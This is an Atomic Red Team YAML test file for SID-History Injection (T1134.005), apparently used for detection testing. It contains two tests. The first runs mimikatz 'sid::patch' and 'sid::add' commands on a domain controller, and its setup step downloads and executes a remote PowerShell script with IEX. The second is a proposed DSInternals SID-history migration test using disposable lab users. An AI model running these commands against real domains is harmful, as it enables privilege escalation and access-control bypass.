attack_technique: T1134.005
display_name: 'Access Token Manipulation: SID-History Injection'
atomic_tests:
- name: Injection SID-History with mimikatz
  auto_generated_guid: 6bef32e5-9456-4072-8f14-35566fb85401
  description: |
    Adversaries may use SID-History Injection to escalate privileges and bypass access controls. Must be run on domain controller
  supported_platforms:
  - windows
  input_arguments:
    sid_to_inject:
      description: SID to inject into sidhistory
      type: string
      default: S-1-5-21-1004336348-1177238915-682003330-1134
    sam_account_name:
      description: Target account to modify
      type: string
      default: '$env:username'
    mimikatz_path:
      description: Mimikatz windows executable
      type: path
      default: 'PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe'
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
    prereq_command: |
      $mimikatz_path = cmd /c echo #{mimikatz_path}
      if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
    get_prereq_command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
      $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
      $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
      $mimikatz_exe = cmd /c echo #{mimikatz_path}
      $basePath = Split-Path $mimikatz_exe | Split-Path
      Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
  executor:
    name: command_prompt
    elevation_required: true
    command: |
      #{mimikatz_path} "privilege::debug" "sid::patch" "sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}" "exit"
    cleanup_command: |
      #{mimikatz_path} "sid::clear /sam:#{sam_account_name}" "exit"
# Append this list item to atomic_tests in the upstream T1134.005.yaml.
# Do not replace the existing test. CI assigns auto_generated_guid.
- name: SID History Modification via DSInternals RPC
  description: |
    Initiates an intra-domain SID history migration from a Windows endpoint using
    DSInternals Add-ADReplSidHistory (IDL_DRSAddSidHistory). Creates two disposable,
    disabled users in a unique OU. The operation adds the source SID to the
    destination sIDHistory and DELETES the source user. Verifies both postconditions.
    This emulates the SID history modification component of T1134.005; it does not
    assign an administrative SID or demonstrate subsequent privileged access.
    Run with a domain identity authorized to create/delete the test objects and
    perform SID history migration. Requires a writable DC, RPC and ADWS access,
    and Success/Failure Account Management auditing on the target DC.
    Audit policy is an operator-managed prerequisite and is never changed by the test.
    Cleanup removes only marked disposable objects and the local state file.
    Do not delete the state file before cleanup. Use a private state-file directory.
    Success prints SourceSIDPresent=True and SourceDeleted=True. Run cleanup with
    the same server and state path. Repeated cleanup without state is a no-op.
    CheckPrereqs checks modules and ADWS access, not migration permissions or audit
    policy. Dependency installation and DC audit configuration are operator-managed.
    https://github.com/MichaelGrafnetter/DSInternals/blob/v7.2/Documentation/PowerShell/Add-ADReplSidHistory.md
    https://attack.mitre.org/techniques/T1134/005/
  supported_platforms:
    - windows
  input_arguments:
    domain_controller:
      description: Writable laboratory DC reachable by RPC and ADWS. Replace the example.
      type: string
      default: dc.example.test
    state_path:
      description: Absolute path to a new state file in an existing private directory; reuse for cleanup.
      type: path
      default: $env:TEMP\T1134.005-DSInternals-state.json
  dependency_executor_name: powershell
  dependencies:
    - description: DSInternals 7.2 or newer with the intra-domain Add-ADReplSidHistory parameter set.
      prereq_command: |
        try {
          Import-Module DSInternals -MinimumVersion 7.2 -ErrorAction Stop
          if ((Get-Command 'DSInternals\Add-ADReplSidHistory' -ErrorAction Stop).Parameters.ContainsKey('DeleteSourceObject')) { exit 0 }
        } catch {}
        exit 1
      get_prereq_command: |
        Write-Host 'On the TEST endpoint, install DSInternals 7.2 or newer from its official PowerShell Gallery package. Do not install it on the documentation workstation.'
    - description: ActiveDirectory PowerShell module (RSAT) on the execution endpoint.
      prereq_command: |
        if (Get-Module -ListAvailable ActiveDirectory) { exit 0 } else { exit 1 }
      get_prereq_command: |
        Write-Host 'Install the Active Directory PowerShell module through the RSAT capability on the TEST endpoint before running this test.'
    - description: The selected DC is reachable through ADWS using the current domain identity.
      prereq_command: |
        try {
          Import-Module ActiveDirectory -ErrorAction Stop
          Get-ADDomain -Server '#{domain_controller}' -ErrorAction Stop | Out-Null
          exit 0
        } catch { Write-Error $_; exit 1 }
      get_prereq_command: |
        Write-Host 'Provide a writable lab DC, an authorized domain logon context, RPC/ADWS connectivity, and Account Management Success/Failure auditing on the DC. Audit settings are not modified automatically.'
  executor:
    name: powershell
    elevation_required: false
    command: |
      $ErrorActionPreference = 'Stop'
      & "PathToAtomicsFolder\T1134.005\src\Invoke-SidHistoryRpcTest.ps1" -Mode Run -Server '#{domain_controller}' -StatePath "#{state_path}"
    cleanup_command: |
      $ErrorActionPreference = 'Stop'
      & "PathToAtomicsFolder\T1134.005\src\Invoke-SidHistoryRpcTest.ps1" -Mode Cleanup -Server '#{domain_controller}' -StatePath "#{state_path}"

